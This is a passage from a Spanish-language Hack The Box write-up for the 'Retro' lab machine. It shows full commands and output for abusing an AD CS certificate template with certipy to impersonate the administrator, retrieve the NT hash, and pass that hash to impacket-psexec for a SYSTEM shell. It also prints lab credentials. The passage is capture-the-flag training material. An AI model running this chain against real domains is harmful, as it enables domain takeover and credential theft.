└─$ certipy req \
    -u 'BANKING$@retro.vl' -p 'w0nder11ng' \
    -ca 'retro-DC-CA' -template 'RetroClients' \
    -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Con el certificado ya puedo autenticarme para obtener un TGT y el hash NTLM del usuario administrador:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Con el hash del administrador puedo obtener una shell via `psexec`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/retro]
└─$ impacket-psexec retro.vl/Administrator@10.129.15.172 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.15.172.....
[*] Found writable share ADMIN$
[*] Uploading file gugsRGGZ.exe
[*] Opening SVCManager on 10.129.15.172.....
[*] Creating service Ekov on 10.129.15.172.....
[*] Starting service Ekov.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bcab2******
```

![](assets/Pasted%20image%2020260206223714.png)
